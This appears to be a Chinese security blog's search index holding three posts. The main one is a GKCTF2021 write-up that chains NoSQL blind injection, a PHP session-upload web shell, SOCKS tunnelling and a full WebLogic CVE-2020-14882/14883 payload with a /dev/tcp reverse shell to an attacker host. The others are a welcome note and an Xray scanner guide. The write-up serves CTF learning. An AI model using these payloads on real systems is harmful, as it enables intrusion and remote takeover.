<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>my-first-blog</title>
    <url>/2021/10/09/my-first-blog/</url>
    <content><![CDATA[<p>欢迎来到我的博客，我会发布一下有关渗透的博文，请多交流！</p>
<span id="more"></span>]]></content>
      <categories>
        <category>个人介绍</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>个人介绍</tag>
      </tags>
  </entry>
  <entry>
    <title>gkctf2021hackme</title>
    <url>/2021/10/10/gkctf2021hackme/</url>
    <content><![CDATA[<p>进入题目，出现的是一个登录框：<br><img src="https://img-blog.csdnimg.cn/img_convert/30b5156edecfcf2b0ff84f6c4b80b580.png#align=left&display=inline&height=486&&originHeight=486&originWidth=676&size=113208&status=done&style=none&width=676" alt="image.png"><br><span id="more"></span>查看源码后提</p>
<p>示：<!--doyounosql?--><br>怀疑是Nosql注入，尝试登录，查看数据包是json传输：<img src="https://img-blog.csdnimg.cn/img_convert/276648c0cae45e8fb08ebad107c0240c.png#align=left&display=inline&height=82&&originHeight=82&originWidth=326&size=2662&status=done&style=none&width=326" alt="image.png"><br>burp抓包，构造永真式登录：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&#123;&quot;$ne&quot;:1&#125;,&quot;password&quot;: &#123;&quot;$ne&quot;:1&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>发现被检测了，<br><img src="https://img-blog.csdnimg.cn/img_convert/01c93c7eaf1817598c624e8457d2ca41.png#align=left&display=inline&height=364&&originHeight=364&originWidth=1031&size=56917&status=done&style=none&width=1031" alt="image.png"><br>根据提示一：使用unicode编码绕过：<br><img src="https://img-blog.csdnimg.cn/img_convert/122aa960385b6f2aedb5031f847afd2b.png#align=left&display=inline&height=375&&originHeight=375&originWidth=1155&size=57703&status=done&style=none&width=1155" alt="image.png"><br>猜测是用Nosql盲注获得admin密码，判定条件为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;msg&quot;:&quot;登录了，但没完全登录&quot;&#125;    // 真</span><br><span class="line">&#123;&quot;msg&quot;:&quot;登录失败&quot;&#125;    // 假</span><br></pre></td></tr></table></figure>

<p>编写盲注脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">password = &#x27;&#x27;</span><br><span class="line">url = &#x27;http://node4.buuoj.cn:29587/login.php&#x27;</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    for c in string.printable:</span><br><span class="line">        if c not in [&#x27;*&#x27;, &#x27;+&#x27;, &#x27;.&#x27;, &#x27;?&#x27;, &#x27;|&#x27;, &#x27;#&#x27;, &#x27;&amp;&#x27;, &#x27;$&#x27;]:</span><br><span class="line"></span><br><span class="line">            # When the method is GET</span><br><span class="line">            get_payload = &#x27;?username=admin&amp;password[$regex]=^%s&#x27; % (password + c)</span><br><span class="line">            # When the method is POST</span><br><span class="line">            post_payload = &#123;</span><br><span class="line">                &quot;username&quot;: &quot;admin&quot;,</span><br><span class="line">                &quot;password[$regex]&quot;: &#x27;^&#x27; + password + c</span><br><span class="line">            &#125;</span><br><span class="line">            # When the method is POST with JSON</span><br><span class="line">            json_payload = &quot;&quot;&quot;&#123;&quot;username&quot;:&quot;admin&quot;, &quot;password&quot;:&#123;&quot;\\u0024\\u0072\\u0065\\u0067\\u0065\\u0078&quot;:&quot;^%s&quot;&#125;&#125;&quot;&quot;&quot; % (password + c)</span><br><span class="line">            headers = &#123;&#x27;Content-Type&#x27;: &#x27;application/json&#x27;&#125;</span><br><span class="line">            r = requests.post(url=url, headers=headers, data=json_payload)    # 简单发送 json</span><br><span class="line"></span><br><span class="line">            #r = requests.post(url=url, data=post_payload)</span><br><span class="line">            if &#x27;但没完全登录&#x27; in r.content.decode():</span><br><span class="line">                print(&quot;[+] %s&quot; % (password + c))</span><br><span class="line">                password += c</span><br></pre></td></tr></table></figure>

<p>得到密码后登录：<br><img src="https://img-blog.csdnimg.cn/img_convert/67a6fed5612d3df484ac5f5098f5cbbe.png#align=left&display=inline&height=425&&originHeight=425&originWidth=1346&size=380198&status=done&style=none&width=1346" alt="image.png"><br>这里可以读取文件：<img src="https://img-blog.csdnimg.cn/img_convert/9cff577c099cd168568470b8f975550a.png#align=left&display=inline&height=173&&originHeight=173&originWidth=1903&size=290076&status=done&style=none&width=1903" alt="image.png"><br>尝试读取flag,提示flag在内网<br><img src="https://img-blog.csdnimg.cn/img_convert/e3eed0179b1158f5d390573af28bb5c2.png#align=left&display=inline&height=50&&originHeight=50&originWidth=527&size=21648&status=done&style=none&width=527" alt="image.png"><br>再次根据提示：注意server和其配置文件！<br>server: nginx/1.17.6，直接读取Nginx配置文件：/usr/local/nginx/conf/nginx.conf，得到如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">worker_processes  1;</span><br><span class="line"></span><br><span class="line">events &#123;</span><br><span class="line">    worker_connections  1024;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http &#123;</span><br><span class="line">    include       mime.types;</span><br><span class="line">    default_type  application/octet-stream;</span><br><span class="line"></span><br><span class="line">    sendfile        on;</span><br><span class="line">    #tcp_nopush     on;</span><br><span class="line"></span><br><span class="line">    #keepalive_timeout  0;</span><br><span class="line">    keepalive_timeout  65;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        listen       80;</span><br><span class="line">        error_page 404 404.php;</span><br><span class="line">        root /usr/local/nginx/html;</span><br><span class="line">        index index.htm index.html index.php;</span><br><span class="line">        location ~ \.php$ &#123;</span><br><span class="line">           root           /usr/local/nginx/html;</span><br><span class="line">           fastcgi_pass   127.0.0.1:9000;</span><br><span class="line">           fastcgi_index  index.php;</span><br><span class="line">           fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;</span><br><span class="line">           include        fastcgi_params;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">resolver 127.0.0.11 valid=0s ipv6=off;</span><br><span class="line">resolver_timeout 10s;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    # weblogic</span><br><span class="line">    server &#123;</span><br><span class="line">		listen       80;</span><br><span class="line">		server_name  weblogic;</span><br><span class="line">		location / &#123;</span><br><span class="line">			proxy_set_header Host $host;</span><br><span class="line">			set $backend weblogic;</span><br><span class="line">			proxy_pass http://$backend:7001;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>发现内网中确实还有一个应用，在内网 <code>weblogic</code> 主机的 7001 端口上运行着一个 weblogic 服务。下面我们就想办法攻击这个内网的 weblogic。<br>根据info.php发现目标环境开启了session.upload_progress.enabled.<br><img src="https://img-blog.csdnimg.cn/img_convert/f3a0ac39c2af6fa8d178b4692a8940e4.png#align=left&display=inline&height=151&&originHeight=151&originWidth=997&size=14896&status=done&style=none&width=997" alt="image.png"><br>可以尝试使用PHP_SESSION_UPLOAD_PROGRESS Getshell.具体参考<a href="https://whoamianony.top/2021/05/14/Web%E5%AE%89%E5%85%A8/%E6%B5%85%E8%B0%88%20SESSION_UPLOAD_PROGRESS%20%E7%9A%84%E5%88%A9%E7%94%A8/">https://whoamianony.top/2021/05/14/Web%E5%AE%89%E5%85%A8/%E6%B5%85%E8%B0%88%20SESSION_UPLOAD_PROGRESS%20%E7%9A%84%E5%88%A9%E7%94%A8/</a><br>构造POC如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://node4.buuoj.cn:29587/index.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&lt;?php phpinfo();fputs(fopen(&#x27;/usr/local/nginx/html/shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[whoami])?&gt;&#x27;);?&gt;&quot;</span> /&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在浏览器打开，使用burpsuite抓包，双开：<br><img src="https://img-blog.csdnimg.cn/img_convert/7303009981cf894602d2c54569a3be09.png#align=left&display=inline&height=821&&originHeight=821&originWidth=1620&size=171506&status=done&style=none&width=1620" alt="image.png"><br>访问/shell.php，使用蚁剑连接：<br><img src="https://img-blog.csdnimg.cn/img_convert/bdd49904063501b8986ffe0f14087f8c.png#align=left&display=inline&height=433&&originHeight=433&originWidth=1012&size=48858&status=done&style=none&width=1012" alt="image.png"><br>接下来就是内网渗透：<br>首先在VPS上上传ew，执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./ew_for_linux64 -s rcsocks -l 1080 -e 1234</span><br></pre></td></tr></table></figure>

<p>该命令的意思是在vps上添加一个转接隧道，监听 1234，把本地 1234 端口收到的代理请求转交给1080端口，这里 1234 端口只是用于传输流量。<br><img src="https://img-blog.csdnimg.cn/img_convert/5b54de0fc496d98770c481a7b0a2d640.png#align=left&display=inline&height=76&&originHeight=76&originWidth=597&size=6922&status=done&style=none&width=597" alt="image.png"><br>在上传ew到目标机：<br><img src="https://img-blog.csdnimg.cn/img_convert/7ebdf6df78b04e2c98c76dbd94f9b6d1.png#align=left&display=inline&height=617&&originHeight=617&originWidth=1012&size=53072&status=done&style=none&width=1012" alt="image.png"><br>执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./ew_for_linux64 -s rssocks -d xx.xx.xx.xx -e 1234</span><br></pre></td></tr></table></figure>

<p>这句话的意思上将本机的1234端口转发到公网地址为xx.xx.xx.xx的机器上。<br>连接成功：<img src="https://img-blog.csdnimg.cn/img_convert/6b8e83f4a8559523599367e1b2d823ea.png#align=left&display=inline&height=84&&originHeight=84&originWidth=459&size=5039&status=done&style=none&width=459" alt="image.png"><br>然后使用 SwichyOmega 配置 socks5 代理服务：<br><img src="https://img-blog.csdnimg.cn/img_convert/df6931bd4d1869f9c92a9fe0accf7298.png#align=left&display=inline&height=503&&originHeight=503&originWidth=1416&size=48139&status=done&style=none&width=1416" alt="image.png"><br>访问weblogic：<br><img src="https://img-blog.csdnimg.cn/img_convert/1806da668ce2610c7fdd74467ee0632f.png#align=left&display=inline&height=737&&originHeight=737&originWidth=1370&size=66876&status=done&style=none&width=1370" alt="image.png"><br>可以看到weblogic的版本为12.2.1.4.0，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Weblogic 是 Oracle 公司推出的 J2EE 应用服务器。在 2020 年 10 月的更新中，Oracle 官方修复了两个长亭科技安全研究员 @voidfyoo 提交的安全漏洞，分别是 CVE-2020-14882 和 CVE-2020-14883。</span><br><span class="line">CVE-2020-14882 允许未授权的用户绕过管理控制台的权限验证访问后台，CVE-2020-14883 允许后台任意用户通过 HTTP 协议执行任意命令。使用这两个漏洞组成的利用链，可通过一个GET请求在远程 Weblogic 服务器上以未授权的任意用户身份执行命令。</span><br></pre></td></tr></table></figure>

<p>首先测试权限绕过漏洞（CVE-2020-14882），访问以下 URL，即可未授权访问到管理后台页面：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http:/weblogic:7001/console/css/%252e%252e%252fconsole.portal</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/img_convert/cabfeceb826717006e63956becd83435.png#align=left&display=inline&height=734&&originHeight=734&originWidth=1277&size=85550&status=done&style=none&width=1277" alt="image.png"><br>绕过登录后，发送以下 POC 可远程执行命令，反弹shell：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET:</span><br><span class="line">    http://weblogic:7001/console/css/%252e%252e%252fconsolejndi.portal?test_handle=com.tangosol.coherence.mvel2.sh.ShellSession(%27weblogic.work.ExecuteThread%20currentThread%20=%20(weblogic.work.ExecuteThread)Thread.currentThread();%20weblogic.work.WorkAdapter%20adapter%20=%20currentThread.getCurrentWork();%20java.lang.reflect.Field%20field%20=%20adapter.getClass().getDeclaredField(%22connectionHandler%22);field.setAccessible(true);Object%20obj%20=%20field.get(adapter);weblogic.servlet.internal.ServletRequestImpl%20req%20=%20(weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod(%22getServletRequest%22).invoke(obj);%20String%20cmd%20=%20req.getHeader(%22cmd%22);String[]%20cmds%20=%20System.getProperty(%22os.name%22).toLowerCase().contains(%22window%22)%20?%20new%20String[]&#123;%22cmd.exe%22,%20%22/c%22,%20cmd&#125;%20:%20new%20String[]&#123;%22/bin/sh%22,%20%22-c%22,%20cmd&#125;;if(cmd%20!=%20null%20)&#123;%20String%20result%20=%20new%20java.util.Scanner(new%20java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter(%22\\\\A%22).next();%20weblogic.servlet.internal.ServletResponseImpl%20res%20=%20(weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod(%22getResponse%22).invoke(req);res.getServletOutputStream().writeStream(new%20weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();&#125;%20currentThread.interrupt();</span><br><span class="line"></span><br><span class="line">HTTP Headers: </span><br><span class="line">	cmd: bash -i &gt;&amp; /dev/tcp/xx.xxx.xxx.xx/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/img_convert/d0aae1cb3963605fc6f7ba1a92fcb352.png#align=left&display=inline&height=365&&originHeight=365&originWidth=1112&size=38416&status=done&style=none&width=1112" alt="image.png"><br>反弹成功：<br><img src="https://img-blog.csdnimg.cn/img_convert/91173c4f71a0ed0b2c81b7eda7006880.png#align=left&display=inline&height=167&&originHeight=167&originWidth=738&size=13724&status=done&style=none&width=738" alt="image.png"><br>得到flag:<br><img src="https://img-blog.csdnimg.cn/img_convert/da801437da8c6a867150525d46ebd139.png#align=left&display=inline&height=121&&originHeight=121&originWidth=470&size=8633&status=done&style=none&width=470" alt="image.png"></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>ctf</tag>
        <tag>weblogic</tag>
        <tag>内网穿透</tag>
      </tags>
  </entry>
  <entry>
    <title>Xray基础使用介绍</title>
    <url>/2021/10/10/Xray%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E4%BB%8B%E7%BB%8D/</url>
    <content><![CDATA[<p>官方使用文档：<br /><a href="https://docs.xray.cool/">https://docs.xray.cool/</a><br /><strong>#xray简介</strong><br />xray 是一款功能强大的安全评估工具，由多名经验丰富的一线安全从业者呕心打造而成，<span id="more"></span>主要特性有:</p>
<ul>
<li><strong>检测速度快</strong>。发包速度快; 漏洞检测算法高效。</li>
<li><strong>支持范围广</strong>。大至 OWASP Top 10 通用漏洞检测，小至各种 CMS 框架 POC，均可以支持。</li>
<li><strong>代码质量高</strong>。编写代码的人员素质高, 通过 Code Review、单元测试、集成测试等多层验证来提高代码可靠性。</li>
<li><strong>高级可定制</strong>。通过配置文件暴露了引擎的各种参数，通过修改配置文件可以极大的客制化功能。</li>
<li><strong>安全无威胁</strong>。xray 定位为一款安全辅助评估工具，而不是攻击工具，内置的所有 payload 和 poc 均为无害化检查。</li>
</ul>
<p>目前支持的漏洞检测类型包括:</p>
<ul>
<li>XSS漏洞检测 (key: xss)</li>
<li>SQL 注入检测 (key: sqldet)</li>
<li>命令/代码注入检测 (key: cmd-injection)</li>
<li>目录枚举 (key: dirscan)</li>
<li>路径穿越检测 (key: path-traversal)</li>
<li>XML 实体注入检测 (key: xxe)</li>
<li>文件上传检测 (key: upload)</li>
<li>弱口令检测 (key: brute-force)</li>
<li>jsonp 检测 (key: jsonp)</li>
<li>ssrf 检测 (key: ssrf)</li>
<li>基线检查 (key: baseline)</li>
<li>任意跳转检测 (key: redirect)</li>
<li>CRLF 注入 (key: crlf-injection)</li>
<li>Struts2 系列漏洞检测 (高级版，key: struts)</li>
<li>Thinkphp系列漏洞检测 (高级版，key: thinkphp)</li>
<li>POC 框架 (key: phantasm)</li>
</ul>
<p>其中 POC 框架默认内置 Github 上贡献的 poc，用户也可以根据需要自行构建 poc 并运行。<br />下载地址：<br />Github：<a href="https://github.com/chaitin/xray/releases">https://github.com/chaitin/xray/releases</a><br /><img src="https://img-blog.csdnimg.cn/img_convert/4fa0f9a64003e91a389cc6f091bb2077.png" alt="image.png"></p>
<ul>
<li><code>darwin_amd64</code> 苹果系统<br /></li>
<li><code>linux_386   </code> Linux x86<br /></li>
<li><code>linux_amd64 </code> Linux x64<br /></li>
<li><code>windows_386 </code> Windows x86<br /></li>
<li><code>windows_amd64</code> Windows x64<br /></li>
<li><code>sha256.txt   </code>校正文件，内含个版本的sha256的哈希值，请下载后自行校正以防被劫持投毒。<br /></li>
<li><code>Source Code  </code> 为Github自动打包的，无意义，请忽略。<br /></li>
</ul>
<p>运行：<br />下载对应系统的版本后，解压缩zip文件，Linux / Mac用户在终端（终端）运行，Windows用户请在Powershell或其他高级Shell中运行，在CMD中运行可能体验不佳。<br /><img src="https://img-blog.csdnimg.cn/img_convert/d7879e6dea3c5b8a7da11d7cf8510cf6.png" alt="image.png"></p>
<ul>
<li><p><code>mitm</code> 中 <code>restriction</code> 中 <code>hostname_allowed</code> 增加 <code>testphp.vulnweb.com</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mitm:</span><br><span class="line">  ...</span><br><span class="line">  restriction:                          </span><br><span class="line">    hostname_allowed:                   # 允许访问的 Hostname，支持格式如 t.com、*.t.com、1.1.1.1、1.1.1.1/24、1.1-4.1.1-8</span><br><span class="line">    - testphp.vulnweb.com</span><br></pre></td></tr></table></figure>
<p>因为我们的测试目标站就是 <code>[http://testphp.vulnweb.com](http://testphp.vulnweb.com)</code>，增加这个过滤之后，xray 将只会扫描该站的流量，避免扫描到非授权目标站点。</p>
</li>
<li><p>设定漏洞扫描结果的输出，这里选择使用 html 文件输出，所以命令行后面要增加 <code>--html-output xray-testphp.html</code>。</p>
</li>
<li><p><strong>xray 配置文件中默认不允许扫描 gov 和 edu 等网站，如果想对这些网站进行授权测试，需要移除 <code>hostname_disallowed</code> 的相关配置才可以。严禁未授权的测试！否则后果自负。</strong></p>
</li>
</ul>
<p>开始扫描：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.\xray_windows_amd64.exe webscan --listen 127.0.0.1:7777 --html-output xray-testphp.html</span><br></pre></td></tr></table></figure>
<p><strong>开始扫描</strong><br />然后就可以看到 xray 界面开始输出漏洞信息，下面是几个快速链接，可以点击用于体验更多的漏洞类型的扫描<br /><img src="https://img-blog.csdnimg.cn/img_convert/fc183441887f1db8afd26e084e7e799d.png" alt="image.png"><br>更多的漏洞类型的扫描<br />[外链图片转存中…(img-uBuaiwX8-1633856890582)]</p>
]]></content>
      <categories>
        <category>渗透测试工具﻿</category>
      </categories>
      <tags>
        <tag>xray</tag>
        <tag>渗透测试工具</tag>
      </tags>
  </entry>
</search>
